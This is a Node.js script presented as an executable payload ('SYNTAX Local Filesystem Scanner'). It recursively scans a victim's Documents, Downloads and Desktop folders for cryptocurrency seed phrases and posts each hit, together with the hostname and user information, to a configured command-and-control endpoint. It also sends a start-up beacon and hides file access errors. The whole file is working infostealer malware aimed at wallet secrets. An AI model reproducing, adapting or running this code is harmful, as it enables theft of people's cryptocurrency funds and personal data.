// SYNTAX: Local Filesystem Scanner v1
// This script is the executable payload. Once on the target machine,
// it will recursively scan for high-value data.

const fs = require('fs').promises;
const path = require('path');
const os = require('os');
const fetch = require('node-fetch');

// --- CONFIGURATION ---
const C2_ENDPOINT = 'http://localhost:4000/log';
const TARGET_DIRECTORIES = [
    path.join(os.homedir(), 'Documents'),
    path.join(os.homedir(), 'Downloads'),
    path.join(os.homedir(), 'Desktop')
];
const TARGET_EXTENSIONS = ['.txt', '.json', '.log', '.dat', '.ini'];
const MAX_FILE_SIZE_KB = 1024; // To avoid scanning huge files

// Regex for finding a 12 or 24 word mnemonic phrase.
const SEED_PHRASE_REGEX = /(\b[a-z]{3,}\b(\s+)){11,23}\b[a-z]{3,}\b/gi;

// --- CORE LOGIC ---

async function exfiltrateData(data) {
    console.log(`[+] Exfiltrating found data...`);
    try {
        await fetch(C2_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        console.log(`[+] Data successfully sent to C2.`);
    } catch (error) {
        console.error(`[!] Failed to exfiltrate data: ${error.message}`);
    }
}

async function scanFile(filePath) {
    try {
        const fileStats = await fs.stat(filePath);
        if (fileStats.size > MAX_FILE_SIZE_KB * 1024) {
            return; // Skip large files
        }

        const content = await fs.readFile(filePath, 'utf8');
        const matches = content.match(SEED_PHRASE_REGEX);

        if (matches && matches.length > 0) {
            console.log(`[+] HIT! Potential seed phrase found in: ${filePath}`);
            for (const match of matches) {
                const report = {
                    success: true,
                    payload: 'LocalFileScanner',
                    captured: match.trim(),
                    sourceFile: filePath,
                    fingerprint: {
                        hostname: os.hostname(),
                        userInfo: os.userInfo()
                    }
                };
                await exfiltrateData(report);
            }
        }
    } catch (error) {
        // Silently fail for files we can't access
    }
}

async function scanDirectory(directoryPath) {
    try {
        const entries = await fs.readdir(directoryPath, { withFileTypes: true });
        console.log(`[*] Scanning directory: ${directoryPath}`);

        for (const entry of entries) {
            const fullPath = path.join(directoryPath, entry.name);
            if (entry.isDirectory()) {
                await scanDirectory(fullPath); // Recursive scan
            } else if (entry.isFile() && TARGET_EXTENSIONS.includes(path.extname(entry.name).toLowerCase())) {
                await scanFile(fullPath);
            }
        }
    } catch (error) {
        console.warn(`[!] Could not scan directory ${directoryPath}: ${error.message}`);
    }
}

async function main() {
    console.log('================================================');
    console.log('      SYNTAX LOCAL SCANNER v1 - INITIALIZED');
    console.log('================================================');
    
    await exfiltrateData({
        success: false,
        reason: 'scanner_started',
        payload: 'LocalFileScanner',
        fingerprint: { hostname: os.hostname(), userInfo: os.userInfo() }
    });

    for (const dir of TARGET_DIRECTORIES) {
        await scanDirectory(dir);
    }

    console.log('================================================');
    console.log('      SCAN COMPLETE. TERMINATING.');
    console.log('================================================');
}

main();
